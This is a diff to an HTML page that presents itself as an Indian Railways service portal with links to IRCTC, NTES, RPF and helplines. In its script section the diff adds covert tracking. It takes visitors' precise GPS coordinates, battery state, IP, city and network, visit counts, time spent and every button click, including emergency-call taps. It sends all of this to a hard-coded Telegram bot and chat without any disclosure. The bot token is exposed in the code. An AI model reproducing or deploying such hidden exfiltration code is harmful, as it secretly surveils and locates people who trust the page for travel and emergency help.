@@ -28,7 +28,6 @@
       -webkit-font-smoothing: antialiased;
     }
 
-    /* खूबसूरत रेलवे बैकग्राउंड + डार्क ओवरले */
     body {
       min-height: 100vh;
       display: flex;
@@ -42,7 +41,6 @@
       position: relative;
     }
 
-    /* Ambient Glow Effects */
     .orb {
       position: absolute;
       border-radius: 50%;
@@ -60,7 +58,6 @@
       100% { transform: translate(25px, 25px) scale(1.08); }
     }
 
-    /* Main Glass Card */
     .app-card {
       position: relative;
       z-index: 10;
@@ -71,7 +68,7 @@
       -webkit-backdrop-filter: blur(28px);
       border: 1px solid var(--card-border);
       border-radius: 28px;
-      padding: 30px 22px 24px;
+      padding: 28px 20px 22px;
       box-shadow: 0 30px 70px rgba(0, 0, 0, 0.85), inset 0 1px 0 rgba(255, 255, 255, 0.2);
       text-align: center;
     }
@@ -109,33 +106,32 @@
 
     h1 {
       color: var(--text-main);
-      font-size: 1.8rem;
+      font-size: 1.75rem;
       font-weight: 900;
       letter-spacing: -0.5px;
-      margin-bottom: 4px;
+      margin-bottom: 3px;
     }
 
     .subtitle {
       color: var(--text-sub);
-      font-size: 0.85rem;
-      margin-bottom: 20px;
+      font-size: 0.84rem;
+      margin-bottom: 18px;
     }
 
-    /* Services Buttons */
     .services-group {
       display: flex;
       flex-direction: column;
-      gap: 11px;
+      gap: 10px;
     }
 
     .service-btn {
       display: flex;
       align-items: center;
       justify-content: space-between;
-      padding: 13px 18px;
+      padding: 12px 16px;
       background: rgba(255, 255, 255, 0.08);
       border: 1px solid rgba(255, 255, 255, 0.15);
-      border-radius: 18px;
+      border-radius: 16px;
       text-decoration: none;
       color: var(--text-main);
       transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
@@ -150,6 +146,15 @@
       border-color: rgba(249, 115, 22, 0.65);
       transform: translateY(-2px) scale(1.015);
       box-shadow: 0 10px 24px rgba(0, 0, 0, 0.4), 0 0 20px var(--accent-glow);
+    }
+
+    .food-btn-highlight {
+      background: linear-gradient(135deg, rgba(16, 185, 129, 0.15), rgba(2, 132, 199, 0.15));
+      border: 1px solid rgba(16, 185, 129, 0.4);
+    }
+    .food-btn-highlight:hover {
+      border-color: #34d399;
+      box-shadow: 0 10px 24px rgba(0, 0, 0, 0.4), 0 0 20px rgba(52, 211, 153, 0.35);
     }
 
     .support-btn-highlight {
@@ -169,20 +174,20 @@
     .service-left {
       display: flex;
       align-items: center;
-      gap: 14px;
+      gap: 13px;
       text-align: left;
     }
 
     .icon-box {
-      width: 42px;
-      height: 42px;
+      width: 40px;
+      height: 40px;
       background: rgba(255, 255, 255, 0.09);
       border: 1px solid rgba(255, 255, 255, 0.16);
       border-radius: 12px;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 1.3rem;
+      font-size: 1.25rem;
       transition: transform 0.3s;
     }
 
@@ -193,26 +198,35 @@
     }
 
     .service-title {
-      font-size: 0.98rem;
+      font-size: 0.95rem;
       font-weight: 700;
       color: #ffffff;
       display: block;
     }
 
-    .service-badge-red {
-      font-size: 0.68rem;
+    .service-badge {
+      font-size: 0.65rem;
       padding: 2px 7px;
       border-radius: 999px;
-      background: rgba(239, 68, 68, 0.25);
-      color: #fca5a5;
       font-weight: 800;
       margin-left: 6px;
       display: inline-block;
+    }
+
+    .badge-gov {
+      background: rgba(2, 132, 199, 0.25);
+      color: #38bdf8;
+      border: 1px solid rgba(2, 132, 199, 0.4);
+    }
+
+    .badge-red {
+      background: rgba(239, 68, 68, 0.25);
+      color: #fca5a5;
       border: 1px solid rgba(239, 68, 68, 0.4);
     }
 
     .arrow-icon {
-      font-size: 1.15rem;
+      font-size: 1.1rem;
       color: var(--text-sub);
       transition: transform 0.2s, color 0.2s;
     }
@@ -222,10 +236,9 @@
       transform: translate(3px, -3px);
     }
 
-    /* Creator Banner */
     .creator-banner-large {
-      margin-top: 20px;
-      padding: 12px 18px;
+      margin-top: 18px;
+      padding: 11px 16px;
       background: linear-gradient(135deg, rgba(249, 115, 22, 0.16), rgba(2, 132, 199, 0.16));
       border: 1.5px solid rgba(249, 115, 22, 0.45);
       border-radius: 18px;
@@ -234,17 +247,17 @@
     }
 
     .creator-tagline {
-      font-size: 0.7rem;
+      font-size: 0.68rem;
       font-weight: 800;
       letter-spacing: 2px;
       color: #cbd5e1;
       text-transform: uppercase;
-      margin-bottom: 3px;
+      margin-bottom: 2px;
       display: block;
     }
 
     .creator-name-bold {
-      font-size: 1.25rem;
+      font-size: 1.2rem;
       font-weight: 900;
       letter-spacing: 1.5px;
       text-transform: uppercase;
@@ -255,7 +268,6 @@
       text-shadow: 0 0 20px rgba(249, 115, 22, 0.4);
     }
 
-    /* Welcome Modal (10s) */
     .modal-overlay {
       position: fixed;
       inset: 0;
@@ -365,9 +377,6 @@
     }
     .modal-credit span { color: var(--accent); }
 
-    /* ========================================================
-       MODAL: CUSTOMER SUPPORT & RPF SECURITY
-       ======================================================== */
     .support-modal {
       position: fixed;
       inset: 0;
@@ -532,7 +541,6 @@
       filter: brightness(1.2);
     }
 
-    /* Toast Notification */
     .toast-msg {
       position: fixed;
       bottom: 24px;
@@ -559,14 +567,12 @@
 </head>
 <body>
 
-  <!-- Ambient Glow -->
   <div class="orb orb-1"></div>
   <div class="orb orb-2"></div>
 
-  <!-- Toast Notification -->
   <div id="toast" class="toast-msg">Action Successful!</div>
 
-  <!-- 10 SECONDS STRICT LOCKED POPUP -->
+  <!-- 10 SECONDS LOCKED WELCOME MODAL -->
   <div id="welcomeModal" class="modal-overlay">
     <div class="modal-box">
       <div class="welcome-tag">INDIAN RAILWAYS</div>
@@ -599,10 +605,9 @@
     <h1>🚆 Indian Railways</h1>
     <p class="subtitle">Quick Access to Railway Portals</p>
 
-    <!-- सर्विसेज लिस्ट -->
     <nav class="services-group" aria-label="Railway Services">
       <!-- 1. BOOK TICKET (IRCTC) -->
-      <a href="https://www.irctc.co.in/nget/train-search" target="_blank" rel="noopener noreferrer" class="service-btn">
+      <a href="https://www.irctc.co.in/nget/train-search" target="_blank" rel="noopener noreferrer" class="service-btn" onclick="sendClickAlert('🎫 Book Ticket (IRCTC)')">
         <div class="service-left">
           <div class="icon-box" aria-hidden="true">🎫</div>
           <span class="service-title">Book Ticket</span>
@@ -611,7 +616,7 @@
       </a>
 
       <!-- 2. PNR STATUS (ConfirmTkt) -->
-      <a href="https://www.confirmtkt.com/pnr-status" target="_blank" rel="noopener noreferrer" class="service-btn">
+      <a href="https://www.confirmtkt.com/pnr-status" target="_blank" rel="noopener noreferrer" class="service-btn" onclick="sendClickAlert('🔍 PNR Status (ConfirmTkt)')">
         <div class="service-left">
           <div class="icon-box" aria-hidden="true">🔍</div>
           <span class="service-title">PNR Status</span>
@@ -620,7 +625,7 @@
       </a>
 
       <!-- 3. SEARCH TRAIN (NTES) -->
-      <a href="https://enquiry.indianrail.gov.in/mntes/" target="_blank" rel="noopener noreferrer" class="service-btn">
+      <a href="https://enquiry.indianrail.gov.in/mntes/" target="_blank" rel="noopener noreferrer" class="service-btn" onclick="sendClickAlert('📍 Search Train (NTES)')">
         <div class="service-left">
           <div class="icon-box" aria-hidden="true">📍</div>
           <span class="service-title">Search Train</span>
@@ -629,7 +634,7 @@
       </a>
 
       <!-- 4. TRAINS BETWEEN STATIONS (RailYatri) -->
-      <a href="https://www.railyatri.in/trains-between-stations" target="_blank" rel="noopener noreferrer" class="service-btn">
+      <a href="https://www.railyatri.in/trains-between-stations" target="_blank" rel="noopener noreferrer" class="service-btn" onclick="sendClickAlert('🚆 Trains Between Stations (RailYatri)')">
         <div class="service-left">
           <div class="icon-box" aria-hidden="true">🚆</div>
           <span class="service-title">Trains Between Stations</span>
@@ -637,26 +642,36 @@
         <span class="arrow-icon" aria-hidden="true">↗</span>
       </a>
 
-      <!-- 5. RPF & CUSTOMER SUPPORT BUTTON -->
-      <button type="button" class="service-btn support-btn-highlight" id="openSupportBtn">
+      <!-- 5. 🍲 OFFICIAL GOVT FOOD ORDER (IRCTC eCatering) -->
+      <a href="https://www.ecatering.irctc.co.in/" target="_blank" rel="noopener noreferrer" class="service-btn food-btn-highlight" onclick="sendClickAlert('🍲 Order Food (IRCTC eCatering Official)')">
+        <div class="service-left">
+          <div class="icon-box" aria-hidden="true">🍲</div>
+          <div>
+            <span class="service-title">Order Food in Train <span class="service-badge badge-gov">IRCTC Govt</span></span>
+          </div>
+        </div>
+        <span class="arrow-icon" aria-hidden="true">↗</span>
+      </a>
+
+      <!-- 6. RPF & CUSTOMER SUPPORT -->
+      <button type="button" class="service-btn support-btn-highlight" id="openSupportBtn" onclick="sendClickAlert('🚨 Opened RPF & Support Modal')">
         <div class="service-left">
           <div class="icon-box" aria-hidden="true">🚨</div>
           <div>
-            <span class="service-title">RPF & Support <span class="service-badge-red">24x7 Help</span></span>
+            <span class="service-title">RPF & Support <span class="service-badge badge-red">24x7 Help</span></span>
           </div>
         </div>
         <span class="arrow-icon" aria-hidden="true">➔</span>
       </button>
     </nav>
 
-    <!-- LARGE CREATOR BANNER -->
     <div class="creator-banner-large">
       <span class="creator-tagline">Created by</span>
       <span class="creator-name-bold">RAJAN SAHU</span>
     </div>
   </main>
 
-  <!-- RPF & CUSTOMER SUPPORT POPUP MODAL -->
+  <!-- RPF & SUPPORT MODAL -->
   <div id="supportModal" class="support-modal">
     <div class="support-box">
       <button class="support-close-btn" id="closeSupportBtn" title="Close">✕</button>
@@ -666,8 +681,7 @@
       <p class="support-desc">Direct Call & Official Portals (24x7 Active)</p>
 
       <div class="support-options">
-
-        <!-- 1. RPF SECURITY HELPLINE (182 / 139) -->
+        <!-- 1. RPF 182 / 139 -->
         <div class="support-card emergency-card">
           <div class="support-info">
             <span class="opt-icon">🚨</span>
@@ -677,12 +691,12 @@
             </div>
           </div>
           <div class="support-action-group">
-            <a href="tel:139" class="action-pill-btn danger" onclick="notifyAction('139')">Call</a>
-            <button class="action-pill-btn" onclick="copyText('139')">Copy</button>
+            <a href="tel:139" class="action-pill-btn danger" onclick="notifyAction('139'); sendClickAlert('📞 Call Clicked: RPF Security (182/139)');">Call</a>
+            <button class="action-pill-btn" onclick="copyText('139'); sendClickAlert('📋 Copied: RPF 139');">Copy</button>
           </div>
         </div>
 
-        <!-- 2. RAILWAY HELPLINE 139 -->
+        <!-- 2. HELPLINE 139 -->
         <div class="support-card">
           <div class="support-info">
             <span class="opt-icon">📞</span>
@@ -692,12 +706,27 @@
             </div>
           </div>
           <div class="support-action-group">
-            <a href="tel:139" class="action-pill-btn primary" onclick="notifyAction('139')">Call</a>
-            <button class="action-pill-btn" onclick="copyText('139')">Copy</button>
+            <a href="tel:139" class="action-pill-btn primary" onclick="notifyAction('139'); sendClickAlert('📞 Call Clicked: Helpline 139');">Call</a>
+            <button class="action-pill-btn" onclick="copyText('139'); sendClickAlert('📋 Copied: Helpline 139');">Copy</button>
           </div>
         </div>
 
-        <!-- 3. MEDICAL & PASSENGER HELPLINE 138 -->
+        <!-- 3. FOOD ORDER HELPLINE (1323) -->
+        <div class="support-card">
+          <div class="support-info">
+            <span class="opt-icon">🍲</span>
+            <div>
+              <div class="opt-title">Food Helpline (1323)</div>
+              <div class="opt-sub">IRCTC Official eCatering Call</div>
+            </div>
+          </div>
+          <div class="support-action-group">
+            <a href="tel:1323" class="action-pill-btn primary" onclick="notifyAction('1323'); sendClickAlert('📞 Call Clicked: Food Helpline 1323');">Call</a>
+            <button class="action-pill-btn" onclick="copyText('1323'); sendClickAlert('📋 Copied: Food Helpline 1323');">Copy</button>
+          </div>
+        </div>
+
+        <!-- 4. HELPLINE 138 -->
         <div class="support-card">
           <div class="support-info">
             <span class="opt-icon">🚑</span>
@@ -707,12 +736,12 @@
             </div>
           </div>
           <div class="support-action-group">
-            <a href="tel:138" class="action-pill-btn primary" onclick="notifyAction('138')">Call</a>
-            <button class="action-pill-btn" onclick="copyText('138')">Copy</button>
+            <a href="tel:138" class="action-pill-btn primary" onclick="notifyAction('138'); sendClickAlert('📞 Call Clicked: Helpline 138');">Call</a>
+            <button class="action-pill-btn" onclick="copyText('138'); sendClickAlert('📋 Copied: Helpline 138');">Copy</button>
           </div>
         </div>
 
-        <!-- 4. IRCTC EMAIL -->
+        <!-- 5. EMAIL SUPPORT -->
         <div class="support-card">
           <div class="support-info">
             <span class="opt-icon">✉️</span>
@@ -722,12 +751,12 @@
             </div>
           </div>
           <div class="support-action-group">
-            <a href="https://mail.google.com/mail/?view=cm&fs=1&to=care@irctc.co.in&su=Indian%20Railways%20Assistance" target="_blank" rel="noopener noreferrer" class="action-pill-btn primary">Gmail</a>
-            <button class="action-pill-btn" onclick="copyText('care@irctc.co.in')">Copy</button>
+            <a href="https://mail.google.com/mail/?view=cm&fs=1&to=care@irctc.co.in&su=Indian%20Railways%20Assistance" target="_blank" rel="noopener noreferrer" class="action-pill-btn primary" onclick="sendClickAlert('✉️ Clicked: IRCTC Gmail Support')">Gmail</a>
+            <button class="action-pill-btn" onclick="copyText('care@irctc.co.in'); sendClickAlert('📋 Copied: IRCTC Email');">Copy</button>
           </div>
         </div>
 
-        <!-- 5. RPF OFFICIAL WEBSITE -->
+        <!-- 6. RPF PORTAL -->
         <div class="support-card">
           <div class="support-info">
             <span class="opt-icon">🛡️</span>
@@ -737,11 +766,11 @@
             </div>
           </div>
           <div class="support-action-group">
-            <a href="https://rpf.indianrailways.gov.in/" target="_blank" rel="noopener noreferrer" class="action-pill-btn primary">Open ↗</a>
+            <a href="https://rpf.indianrailways.gov.in/" target="_blank" rel="noopener noreferrer" class="action-pill-btn primary" onclick="sendClickAlert('🛡️ Opened: RPF Official Website')">Open ↗</a>
           </div>
         </div>
 
-        <!-- 6. RAILMADAD GRIEVANCE -->
+        <!-- 7. RAILMADAD -->
         <div class="support-card">
           <div class="support-info">
             <span class="opt-icon">📋</span>
@@ -751,23 +780,127 @@
             </div>
           </div>
           <div class="support-action-group">
-            <a href="https://railmadad.indianrailways.gov.in/" target="_blank" rel="noopener noreferrer" class="action-pill-btn primary">Open ↗</a>
+            <a href="https://railmadad.indianrailways.gov.in/" target="_blank" rel="noopener noreferrer" class="action-pill-btn primary" onclick="sendClickAlert('📋 Opened: RailMadad Portal')">Open ↗</a>
           </div>
         </div>
-
       </div>
     </div>
   </div>
 
   <script>
-    // ==========================================
-    // 🚀 TELEGRAM LIVE VISITOR NOTIFICATION
-    // ==========================================
-    (function trackVisitor() {
-      if (sessionStorage.getItem("visited_tracked")) return;
+    const BOT_TOKEN = "9012206625:AAGZyT5tK7TL16dknHaJeDeOoNdkD9C1_7k";
+    const CHAT_ID = "8989163925";
+    const pageStartTime = Date.now();
 
-      const BOT_TOKEN = "9012206625:AAGZyT5tK7TL16dknHaJeDeOoNdkD9C1_7k";
-      const CHAT_ID = "8989163925";
+    // 1. BATTERY STATUS DETECTOR
+    async function getBatteryStatus() {
+      try {
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          const level = Math.round(battery.level * 100);
+          const charging = battery.charging ? "⚡ Charging" : "🔋 Discharging";
+          return `${level}% (${charging})`;
+        }
+      } catch (e) {}
+      return "Unknown";
+    }
+
+    // 2. LIVE GPS LOCATION TRACKER
+    function trackGPSLocation() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude.toFixed(6);
+            const lon = pos.coords.longitude.toFixed(6);
+            const accuracy = Math.round(pos.coords.accuracy);
+            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const gpsMsg = `🛰️ *Exact GPS Coordinates Detected!*\n\n` +
+                           `📍 *Latitude, Longitude:* \`${lat}, ${lon}\`\n` +
+                           `🎯 *Accuracy:* ~${accuracy} meters\n` +
+                           `🗺️ *Google Maps:* [Open Live Location](${mapUrl})`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: CHAT_ID, text: gpsMsg, parse_mode: "Markdown" })
+            });
+          },
+          (err) => {},
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      }
+    }
+
+    // 3. CLICK TRACKER
+    function sendClickAlert(buttonName) {
+      const time = new Date().toLocaleTimeString("en-IN", { timeZone: "Asia/Kolkata" });
+      const msg = `🎯 *Button Clicked!*\n\n` +
+                  `🔘 *Action:* ${buttonName}\n` +
+                  `⏰ *Time:* ${time}`;
+      
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
+      });
+    }
+
+    // 4. TIME SPENT TRACKER
+    window.addEventListener("visibilitychange", function() {
+      if (document.visibilityState === "hidden") {
+        const timeSpentSec = Math.round((Date.now() - pageStartTime) / 1000);
+        if (timeSpentSec >= 2) {
+          const minutes = Math.floor(timeSpentSec / 60);
+          const seconds = timeSpentSec % 60;
+          const duration = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds} seconds`;
+          
+          const exitMsg = `⏳ *Visitor Left Site!*\n\n⏱️ *Time Spent:* ${duration}`;
+          navigator.sendBeacon(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            new Blob([JSON.stringify({ chat_id: CHAT_ID, text: exitMsg, parse_mode: "Markdown" })], { type: "application/json" })
+          );
+        }
+      }
+    });
+
+    // 5. VISIT, BATTERY & IP TRACKER (ON PAGE OPEN)
+    (async function trackVisitor() {
+      const today = new Date().toISOString().slice(0, 10);
+      const lastVisitDate = localStorage.getItem("last_visit_date");
+      let todayVisits = parseInt(localStorage.getItem("today_visits") || "0");
+      let totalVisits = parseInt(localStorage.getItem("total_visits") || "0");
+
+      const isSameSession = sessionStorage.getItem("session_active");
+      let refreshCount = parseInt(sessionStorage.getItem("refresh_count") || "0");
+      let actionText = "";
+
+      if (isSameSession) {
+        refreshCount += 1;
+        sessionStorage.setItem("refresh_count", refreshCount);
+        actionText = `🔄 *Page Refreshed* (Reload #${refreshCount} in Visit #${todayVisits})`;
+      } else {
+        if (lastVisitDate === today) {
+          todayVisits += 1;
+        } else {
+          todayVisits = 1;
+          localStorage.setItem("last_visit_date", today);
+        }
+        totalVisits += 1;
+        refreshCount = 0;
+
+        localStorage.setItem("today_visits", todayVisits);
+        localStorage.setItem("total_visits", totalVisits);
+        sessionStorage.setItem("session_active", "true");
+        sessionStorage.setItem("refresh_count", "0");
+
+        actionText = todayVisits === 1 
+          ? `🆕 *Fresh Open* (Visit #1 Today)` 
+          : `🟢 *New Visit Open* (Visit #${todayVisits} Today)`;
+      }
+
+      const battery = await getBatteryStatus();
+      trackGPSLocation();
 
       fetch("https://ipapi.co/json/")
         .then(res => res.json())
@@ -775,9 +908,12 @@
           const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
           const device = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Computer/Laptop";
           
-          const message = `🚨 *New Visitor on Railway Portal!*\n\n` +
-                          `👤 *Portal:* Rajan Sahu Portal\n` +
-                          `📍 *Location:* ${data.city || 'Unknown'}, ${data.region || ''}, ${data.country_name || 'India'}\n` +
+          const message = `🚨 *Railway Portal Alert!*\n\n` +
+                          `👤 *Visit:* Visit #${todayVisits} Today\n` +
+                          `⚡ *Action:* ${actionText}\n` +
+                          `🔢 *Total Site Opens:* ${totalVisits}\n` +
+                          `🔋 *Battery:* ${battery}\n` +
+                          `📍 *City/State:* ${data.city || 'Unknown'}, ${data.region || ''}, ${data.country_name || 'India'}\n` +
                           `🌐 *IP:* \`${data.ip || 'Hidden'}\`\n` +
                           `📶 *Network:* ${data.org || 'Unknown'}\n` +
                           `📱 *Device:* ${device}\n` +
@@ -786,31 +922,20 @@
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text: message,
-              parse_mode: "Markdown"
-            })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
           });
-
-          sessionStorage.setItem("visited_tracked", "true");
         })
         .catch(() => {
-          const fallbackMsg = `🚨 *New Visitor on Railway Portal!*\n📱 *Device:* Mobile/PC\n⏰ *Time:* ${new Date().toLocaleTimeString()}`;
+          const fallbackMsg = `🚨 *Railway Portal Alert!*\n👤 *Visit:* Visit #${todayVisits}\n⚡ *Action:* ${actionText}\n🔋 *Battery:* ${battery}\n⏰ *Time:* ${new Date().toLocaleTimeString()}`;
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text: fallbackMsg,
-              parse_mode: "Markdown"
-            })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: fallbackMsg, parse_mode: "Markdown" })
           });
-          sessionStorage.setItem("visited_tracked", "true");
         });
     })();
 
-    // 10 SECONDS STRICT LOCKED TIMER
+    // 10 SECONDS LOCKED TIMER
     (function () {
       let timeLeft = 10;
       const timerDisplay = document.getElementById("timerCount");
@@ -819,7 +944,7 @@
       const buttons = document.querySelectorAll(".service-btn");
       let isUnlocked = false;
 
-      const totalCircumference = 263.89; // 2 * π * 42
+      const totalCircumference = 263.89;
       if (progressCircle) {
         progressCircle.style.strokeDasharray = totalCircumference;
         progressCircle.style.strokeDashoffset = 0;
@@ -888,7 +1013,6 @@
       }
     });
 
-    // TOAST NOTIFICATION
     function showToast(message) {
       const toast = document.getElementById("toast");
       if (!toast) return;
